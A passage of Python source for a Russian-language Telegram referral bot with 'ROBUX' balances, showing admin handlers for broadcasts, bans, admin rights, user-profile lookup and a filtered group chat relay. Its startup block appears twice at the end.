    back_markup.add(back_btn)
    
    bot.send_message(
        message.chat.id, 
        f"📋 Заявки (всего: {total_requests})\n\n"
        f"Последние 20 заявок:\n"
        f"Нажмите на заявку для просмотра",
        reply_markup=markup
    )
    bot.send_message(
        message.chat.id,
        "Используйте кнопку ниже для возврата в админ-панель",
        reply_markup=back_markup
    )

@bot.message_handler(func=lambda message: message.text == "⬅️ Назад")
def handle_back_button(message):
    """Возврат в админ-панель"""
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        admin_panel(message)
    else:
        send_main_menu(message.chat.id, message.from_user.id)

# Словарь для хранения состояния рассылки
broadcast_state = {}

@bot.message_handler(func=lambda message: message.text == "📢Рассылка")
def handle_broadcast_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "Напишите текст для рассылки, firstname:", reply_markup = telebot.types.ReplyKeyboardRemove())
        broadcast_state[message.chat.id] = "awaiting_text"

@bot.message_handler(func=lambda message: message.chat.id in broadcast_state and broadcast_state[message.chat.id] == "awaiting_text")
def handle_broadcast_text(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    user_ids = get_all_user_ids()
    for user_id in user_ids:
        try:
            bot.send_message(user_id, message.text)
        except Exception as e:
           print(f"Не удалось отправить сообщение пользователю {user_id}: {e}")
    bot.send_message(message.chat.id, "Рассылка завершена", reply_markup = telebot.types.ReplyKeyboardRemove())
    del broadcast_state[message.chat.id]

@bot.message_handler(func=lambda message: message.text == "⛔️Забанить")
def handle_ban_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "Напишите уникальный ID пользователя, которого нужно забанить:", reply_markup = telebot.types.ReplyKeyboardRemove())
        ban_state[message.chat.id] = "awaiting_ban_id"

@bot.message_handler(func=lambda message: message.chat.id in ban_state and ban_state[message.chat.id] == "awaiting_ban_id")
def handle_ban_id(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    unique_id = message.text
    if ban_user(unique_id):
        bot.send_message(message.chat.id, f"Пользователь с ID {unique_id} был забанен.", reply_markup = telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(message.chat.id, "Неверный уникальный ID.", reply_markup = telebot.types.ReplyKeyboardRemove())
    del ban_state[message.chat.id]

@bot.message_handler(func=lambda message: message.text == "✅Разбанить")
def handle_unban_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "Напишите уникальный ID пользователя, которого нужно разбанить:", reply_markup = telebot.types.ReplyKeyboardRemove())
        ban_state[message.chat.id] = "awaiting_unban_id"

@bot.message_handler(func=lambda message: message.chat.id in ban_state and ban_state[message.chat.id] == "awaiting_unban_id")
def handle_unban_id(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    unique_id = message.text
    if unban_user(unique_id):
        bot.send_message(message.chat.id, f"Пользователь с ID {unique_id} был разбанен.", reply_markup = telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(message.chat.id, "Неверный уникальный ID.", reply_markup = telebot.types.ReplyKeyboardRemove())
    del ban_state[message.chat.id]

@bot.message_handler(func=lambda message: message.text == "👑Сделать админом")
def handle_add_admin_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "Введите уникальный ID пользователя, которого нужно сделать администратором:", reply_markup = telebot.types.ReplyKeyboardRemove())
        admin_add_state[message.chat.id] = "awaiting_add_admin_id"

@bot.message_handler(func=lambda message: message.chat.id in admin_add_state and admin_add_state[message.chat.id] == "awaiting_add_admin_id")
def handle_add_admin_id(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    unique_id = message.text
    if set_admin(unique_id):
        bot.send_message(message.chat.id, f"Пользователь с ID {unique_id} теперь является администратором.", reply_markup = telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(message.chat.id, "Неверный уникальный ID.", reply_markup = telebot.types.ReplyKeyboardRemove())
    del admin_add_state[message.chat.id]

@bot.message_handler(func=lambda message: message.text == "❌Удалить админа")
def handle_remove_admin_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "Введите уникальный ID пользователя, которого нужно лишить прав администратора:", reply_markup = telebot.types.ReplyKeyboardRemove())
        admin_remove_state[message.chat.id] = "awaiting_remove_admin_id"

@bot.message_handler(func=lambda message: message.chat.id in admin_remove_state and admin_remove_state[message.chat.id] == "awaiting_remove_admin_id")
def handle_remove_admin_id(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    unique_id = message.text
    if remove_admin(unique_id):
        bot.send_message(message.chat.id, f"Пользователь с ID {unique_id} больше не является администратором.", reply_markup = telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(message.chat.id, "Неверный уникальный ID.", reply_markup = telebot.types.ReplyKeyboardRemove())
    del admin_remove_state[message.chat.id]

@bot.message_handler(func=lambda message: message.text == "🔍Пробив")
def handle_probiv_button(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if message.from_user.id in admin_ids or is_user_admin(message.from_user.id):
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        button_by_username = telebot.types.KeyboardButton(text='По @юз')
        button_by_unique_id = telebot.types.KeyboardButton(text='По уникальному ID')
        markup.add(button_by_username, button_by_unique_id)
        bot.send_message(message.chat.id, "Выберите тип поиска:", reply_markup=markup)
        probiv_state[message.chat.id] = "awaiting_probiv_type"

@bot.message_handler(func=lambda message: message.chat.id in probiv_state and probiv_state[message.chat.id] == "awaiting_probiv_type" and message.text == "По @юз")
def handle_probiv_by_username(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    bot.send_message(message.chat.id, "Введите @юз пользователя:", reply_markup=telebot.types.ReplyKeyboardRemove())
    probiv_state[message.chat.id] = "awaiting_probiv_username"

@bot.message_handler(func=lambda message: message.chat.id in probiv_state and probiv_state[message.chat.id] == "awaiting_probiv_username")
def handle_probiv_username_input(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    username = message.text.replace("@", "")
    user_info = get_user_by_username(username)
    if user_info:
       user_id, unique_id = user_info
       user_data = get_user_info(user_id)
       if user_data:
          username, invite, balance, unique_id, banned, is_admin = user_data
          referral_count = get_referral_count(user_id)
          ref_link = f"https://t.me/{bot.get_me().username}?start={username}"

          profile_message = f"👍 Информация о {message.from_user.first_name} (@{username})\n"
          profile_message += f"📈 Приведено человек: {referral_count}\n"
          profile_message += f"💲 Баланс: {balance} ROBUX\n"
          profile_message += f"🔋 Ваша рефка: {ref_link}\n"
          profile_message += f"🆔 ID: {unique_id}"

          bot.send_message(message.chat.id, profile_message)
       else:
            bot.send_message(message.chat.id, "Ошибка получения данных пользователя.", reply_markup=telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(message.chat.id, "Пользователь с таким @юзом не найден.", reply_markup=telebot.types.ReplyKeyboardRemove())
    del probiv_state[message.chat.id]

@bot.message_handler(func=lambda message: message.chat.id in probiv_state and probiv_state[message.chat.id] == "awaiting_probiv_type" and message.text == "По уникальному ID")
def handle_probiv_by_unique_id(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    bot.send_message(message.chat.id, "Введите уникальный ID пользователя:", reply_markup=telebot.types.ReplyKeyboardRemove())
    probiv_state[message.chat.id] = "awaiting_probiv_unique_id"

@bot.message_handler(func=lambda message: message.chat.id in probiv_state and probiv_state[message.chat.id] == "awaiting_probiv_unique_id")
def handle_probiv_unique_id_input(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    unique_id = message.text
    user_info = get_user_by_unique_id(unique_id)
    if user_info:
       user_id, username = user_info
       user_data = get_user_info(user_id)
       if user_data:
          username, invite, balance, unique_id, banned, is_admin = user_data
          referral_count = get_referral_count(user_id)
          ref_link = f"https://t.me/{bot.get_me().username}?start={username}"

          profile_message = f"👍 Информация о {message.from_user.first_name} (@{username})\n"
          profile_message += f"📈 Приведено человек: {referral_count}\n"
          profile_message += f"💲 Баланс: {balance} ROBUX\n"
          profile_message += f"🔋 Ваша рефка: {ref_link}\n"
          profile_message += f"🆔 юз: @{username} ({unique_id})"

          bot.send_message(message.chat.id, profile_message)
       else:
            bot.send_message(message.chat.id, "Ошибка получения данных пользователя.", reply_markup=telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(message.chat.id, "Пользователь с таким уникальным ID не найден.", reply_markup=telebot.types.ReplyKeyboardRemove())
    del probiv_state[message.chat.id]


@bot.message_handler(func=lambda message: message.chat.id in chat_users and message.text)
def handle_chat_message(message):
    if is_user_banned(message.from_user.id):
        bot.send_message(message.chat.id, "Вы были забанены в боте за мошеннические действия вы больше не можете пользоваться этим ботом.")
        return
    if filter_message(message.text):
      username = message.from_user.username
      for user_id in chat_users:
          if user_id != message.from_user.id:
              try:
                  bot.send_message(user_id, f"@{username}: {message.text}")
              except Exception as e:
                  print(f"Не удалось отправить сообщение пользователю {user_id}: {e}")
    else:
        bot.send_message(message.chat.id, "Ваше сообщение заблокировано!")

def signal_handler(sig, frame):
    print('Выход...')
    bot.stop_polling()
    sys.exit(0)

# Установка обработчика сигналов
signal.signal(signal.SIGINT, signal_handler)

if __name__ == '__main__':
    print("Запуск бота...")
    print(f"ID администраторов: {admin_ids}")
    
    # Создаем базу данных при запуске
    create_database()
    print("База данных инициализирована")
    
    # Запускаем бота
    print("Бот запущен и готов к работе!")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

def signal_handler(sig, frame):
    print('Выход...')
    bot.stop_polling()
    sys.exit(0)

# Установка обработчика сигналов
signal.signal(signal.SIGINT, signal_handler)

if __name__ == '__main__':
    print("Запуск бота...")
    print(f"ID администраторов: {admin_ids}")
    
    # Создаем базу данных при запуске
    create_database()
    print("База данных инициализирована")
    
    # Запускаем бота
    print("Бот запущен и готов к работе!")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
